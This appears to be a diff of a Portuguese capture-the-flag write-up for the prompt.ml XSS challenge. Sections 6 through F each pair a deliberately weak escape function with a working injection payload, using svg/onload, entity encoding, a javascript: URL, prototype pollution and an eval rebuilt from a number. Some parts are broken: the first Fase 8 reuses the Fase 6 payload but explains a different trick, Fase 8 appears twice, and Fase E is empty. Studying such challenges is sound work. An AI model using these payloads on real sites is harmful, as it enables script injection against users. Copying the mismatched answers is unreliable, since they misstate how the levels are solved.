@@ -147,21 +147,372 @@ Para explorarmos essa vulnerabilidade usaremos:
 
 Por que funciona?
 
+O filtro usou regex fraco (. não casa quebras de linha).
 
-&#112; → p
+O atacante inseriu uma quebra de linha entre o nome do evento e o sinal =.
 
-&#114; → r
+O navegador ignora a quebra e interpreta como atributo válido `(onerror=)`.
 
-&#111; → o
+O onerror dispara quando a imagem não carrega → `prompt(1)` executa.
 
-&#109; → m
+### Fase 6
+Este é o código dado:
 
-&#112; → p
+```bash
+function escape(input) {
+    // let's do a post redirection
+    try {
+        // pass in formURL#formDataJSON
+        // e.g. http://httpbin.org/post#{"name":"Matt"}
+        var segments = input.split('#');
+        var formURL = segments[0];
+        var formData = JSON.parse(segments[1]);
 
-&#116; → t
+        var form = document.createElement('form');
+        form.action = formURL;
+        form.method = 'post';
 
-&#40; → (
+        for (var i in formData) {
+            var input = form.appendChild(document.createElement('input'));
+            input.name = i;
+            input.setAttribute('value', formData[i]);
+        }
 
-&#49; → 1
+        return form.outerHTML + '                         \n\
+<script>                                                  \n\
+    // forbid javascript: or vbscript: and data: stuff    \n\
+    if (!/script:|data:/i.test(document.forms[0].action)) \n\
+        document.forms[0].submit();                       \n\
+    else                                                  \n\
+        document.write("Action forbidden.")               \n\
+</script>                                                 \n\
+        ';
+    } catch (e) {
+        return 'Invalid form data.';
+    }
+}          
+```
 
-&#41; → )
+No código, a função recebe uma entrada no formato `URL#JSON`, gerando um formulário HTML a partir dos dados do JSON e realizando automaticamente o envio por POST.
+
+Para explorarmos essa vulnerabilidade usaremos:
+
+```bash
+javascript:prompt(1)#{"action":1}
+```
+
+Por que funciona? 
+
+- Quando você coloca `javascript:` em um link (ou na barra do navegador), tudo depois de javascript: é avaliado como código JavaScript.
+
+- O navegador interpreta apenas a parte antes do # como código JavaScript.
+
+- Tudo após o # é tratado como fragmento da URL (hash), o navegador não executa isso como código.
+
+### Fase 7
+Este é o código dado:
+
+```bash
+function escape(input) {
+    // pass in something like dog#cat#bird#mouse...
+    var segments = input.split('#');
+    return segments.map(function(title) {
+        // title can only contain 12 characters
+        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
+    }).join('\n');
+}        
+```
+No código a função recebe uma string com títulos separados por # e limita cada título a cada 12 caracteres e transforma cada um em uma tag <p> com classe comment e atributo title. Depois junta tudo em uma string com quebra de linha.
+
+Para explorarmos essa vulnerabilidade usaremos:
+
+```bash
+"><svg/m=#"onload='/*#*/prompt(1)'
+```
+
+Por que funciona? 
+
+`>`: fecha o value
+
+`<svg>`: Entra no svg e para confundir/fechar atributos anteriores, acrescentamos uma `/` e `m=#` é só algo que faz o navegador não quebrar, mas não é usado depois.
+
+`onload='prompt(1)'`: Usado para disparar o prompt(1), logo depois da tag ser carregada.
+
+`/*#*/`: Comentário usado para burlar filtros de caracteres, ele é necessário porque o navegador ignora o comentário, porém ele quebra o padrão que o filtro procura.
+
+### Fase 8
+Este é o código dado:
+
+```bash
+function escape(input) {
+    // prevent input from getting out of comment
+    // strip off line-breaks and stuff
+    input = input.replace(/[\r\n</"]/g, '');
+
+    return '                                \n\
+<script>                                    \n\
+    // console.log("' + input + '");        \n\
+</script> ';
+}        
+```
+Nesse código, a função escape remove quebra de linh, aspas e alguns caracteres HTML, inserindo a string dentro de um comentário em <script> com um console.log.
+
+Para explorarmos essa vulnerabilidade usaremos:
+
+```bash
+javascript:prompt(1)#{"action":1}
+```
+(executado no console)
+
+Por que funciona? 
+
+Funciona porque `\u2028` em JavaScript é interpretado como uma quebra de linha, portanto encerra o comentário e passa a executar o prompt(1).
+
+### Fase 8
+Este é o código dado:
+
+```bash
+function escape(input) {
+    // filter potential start-tags
+    input = input.replace(/<([a-zA-Z])/g, '<_$1');
+    // use all-caps for heading
+    input = input.toUpperCase();
+
+    // sample input: you shall not pass! => YOU SHALL NOT PASS!
+    return '<h1>' + input + '</h1>';
+}        
+```
+O código procura qualquer tag HTML que começa com < e é seguido de letra ele adiciona em _ depois <.
+
+Para explorarmos essa vulnerabilidade usaremos:
+
+```bash
+<ſvg/onload=&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;>
+```
+Por que funciona? 
+
+`ſvg`: Um caracter unicode (U+ 017F) que visualmente parece com s, então é aceito como equivalente.
+
+`onload=`: Dispara quando o elemento é carregado.
+
+`&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;`: São entidades númericas HTML que representa caracteres ASCII, que quando interpretado, converte para texto normal.
+
+`&#112;` → p
+
+`&#114;` → r
+
+`&#111;` → o
+
+`&#109;` → m
+
+`&#112;` → p
+
+`&#116;` → t
+
+`&#40;` → (
+
+`&#49;` → 1
+
+`&#41;` → )
+
+### Fase A
+Este é o código dado:
+
+```bash
+function escape(input) {
+    // (╯°□°）╯︵ ┻━┻
+    input = encodeURIComponent(input).replace(/prompt/g, 'alert');
+    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro
+    input = input.replace(/'/g, '');
+
+    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
+    return '<script>' + input + '</script> ';
+}        
+```
+
+A função aplica codificação e manipulações no input para bloquear o uso de prompt, mas insere o resultado diretamente dentro de uma tag <script>.
+
+Para explorarmos essa vulnerabilidade usaremos:
+
+```bash
+p'rompt(1)
+```
+Por que funciona? 
+
+A sequência `p'rompt(1)` é usada para driblar filtros básicos que bloqueiam diretamente a palavra prompt e ao inserir um caractere extra, como ', dentro do termo, o filtro não identifica a palavra completa e permite que ela passe. 
+
+### Fase B
+Este é o código dado:
+
+```bash
+function escape(input) {
+    // name should not contain special characters
+    var memberName = input.replace(/[[|\s+*/\\<>&^:;=~!%-]/g, '');
+
+    // data to be parsed as JSON
+    var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';
+
+    // directly "parse" data in script context
+    return '                                \n\
+<script>                                    \n\
+    var data = ' + dataString + ';          \n\
+    if (data.action === "login")            \n\
+        document.write(data.message)        \n\
+</script> ';
+}        
+```
+O código cria uma função chamada escape(input) que tenta higienizar o valor recebido (como um nome de usuário), transforma esse valor em JSON e depois o insere dentro de uma tag <script>.
+
+Para explorarmos essa vulnerabilidade usaremos:
+
+```bash
+"(prompt(1))in"
+```
+
+Por que funciona? 
+
+Funciona porque o filtro não bloqueia, e no contexto do <script> o JS interpreta (prompt(1)) como uma chamada de função legítima, e o in serve para que o código continue sendo uma expressão válida e não quebre o script.
+
+### Fase C
+Este é o código dado:
+
+```bash
+function escape(input) {
+    // in Soviet Russia...
+    input = encodeURIComponent(input).replace(/'/g, '');
+    // table flips you!
+    input = input.replace(/prompt/g, 'alert');
+
+    // ノ┬─┬ノ ︵ ( \o°o)\
+    return '<script>' + input + '</script> ';
+}        
+```
+
+A função escape(input) codifica o valor recebido com encodeURIComponent, elimina caracteres de aspas simples e troca qualquer ocorrência da palavra prompt por alert. Em seguida, insere esse conteúdo diretamente dentro de uma tag <script>.
+
+Para explorarmos essa vulnerabilidade usaremos:
+
+```bash
+eval(630038579..toString(30))(1)
+```
+
+Por que funciona? 
+
+Esse código funciona porque o número 630038579 convertido para base 30 vira a string "eval". Assim, ele reconstroi dinamicamente a função eval e a executa com argumento 1.
+
+### Fase D
+Este é o código dado:
+
+```bash
+function escape(input) {
+    // extend method from Underscore library
+    // _.extend(destination, *sources) 
+    function extend(obj) {
+        var source, prop;
+        for (var i = 1, length = arguments.length; i < length; i++) {
+            source = arguments[i];
+            for (prop in source) {
+                obj[prop] = source[prop];
+            }
+        }
+        return obj;
+    }
+    // a simple picture plugin
+    try {
+        // pass in something like {"source":"http://sandbox.prompt.ml/PROMPT.JPG"}
+        var data = JSON.parse(input);
+        var config = extend({
+            // default image source
+            source: 'http://placehold.it/350x150'
+        }, JSON.parse(input));
+        // forbit invalid image source
+        if (/[^\w:\/.]/.test(config.source)) {
+            delete config.source;
+        }
+        // purify the source by stripping off "
+        var source = config.source.replace(/"/g, '');
+        // insert the content using mustache-ish template
+        return '<img src="{{source}}">'.replace('{{source}}', source);
+    } catch (e) {
+        return 'Invalid image data.';
+    }
+}        
+```
+
+O código recebe um JSON com a URL de uma imagem, aplica configurações padrão por meio de extend, faz uma validação simplificada da URL usando regex e depois gera uma tag substituindo diretamente {{source}}.
+
+
+Para explorarmos essa vulnerabilidade usaremos:
+
+```bash
+{"source":{},"__proto__":{"source":"$`onerror=prompt(1)>"}}
+```
+
+Por que funciona? 
+
+Isso funciona porque o extend() permite poluir o `__proto__`, o que injeta a propriedade source maliciosa dentro de config. A regex de validação não é suficiente para bloquear isso, e o valor injetado vai parar dentro do src da <img>, ativando o onerror.
+
+### Fase E
+Este é o código dado:
+
+```bash
+
+```
+
+Para explorarmos essa vulnerabilidade usaremos:
+
+```bash
+
+```
+
+Por que funciona? 
+
+### Fase F
+Este é o código dado:
+
+```bash
+function escape(input) {
+    // sort of spoiler of level 7
+    input = input.replace(/\*/g, '');
+    // pass in something like dog#cat#bird#mouse...
+    var segments = input.split('#');
+
+    return segments.map(function(title, index) {
+        // title can only contain 15 characters
+        return '<p class="comment" title="' + title.slice(0, 15) + '" data-comment=\'{"id":' + index + '}\'></p>';
+    }).join('\n');
+}        
+```
+No código, a função escape recebe um texto no formato `texto1#texto2#texto3...` e realiza várias operações para gerar conteúdo HTML estruturado:
+
+- Remoção de caracteres especiais:
+
+Inicialmente, todos os asteriscos (*) presentes no input são eliminados, evitando que eles interfiram na formatação ou no conteúdo dos parágrafos gerados.
+
+- Divisão do texto em segmentos:
+
+O input é separado usando o caractere `#` como delimitador, cada pedaço entre os # se torna um segmento independente que será transformado em um parágrafo.
+
+- Geração de parágrafos HTML:
+
+Para cada segmento criado, a função gera uma tag `<p>` no HTML.
+
+Cada parágrafo recebe dois atributos especiais:
+
+`title`: contém os primeiros 15 caracteres do segmento e esses caracteres não passam por sanitização, ou seja, são inseridos diretamente no HTML.
+
+`data-comment`: contém um JSON seguro no formato {"id": índice}, em que o índice representa a posição do segmento na lista.
+
+Dessa forma, a função transforma um texto delimitado por `#` em múltiplos parágrafos HTML, cada um com metadados associados de forma estruturada e segura (para o JSON), mas deixando o conteúdo textual parcialmente exposto no atributo title.
+
+Para explorarmos essa vulnerabilidade usaremos:
+
+```bash
+"><svg><!--#--><script><!--#-->prompt(1<!--#-->)</script>
+```
+
+Por que funciona? 
+
+O filtro da função escape não impede a injeção, porque ele só remove * e limita o tamanho do título, não escapa caracteres especiais como " ou <, o payload fecha o atributo title (">) e insere tags diretamente no HTML.
+
+Os comentários HTML `<!--#-->` são ignorados pelo navegador, mas enganam o filtro, permitindo que prompt(1) seja executado sem ser detectado.
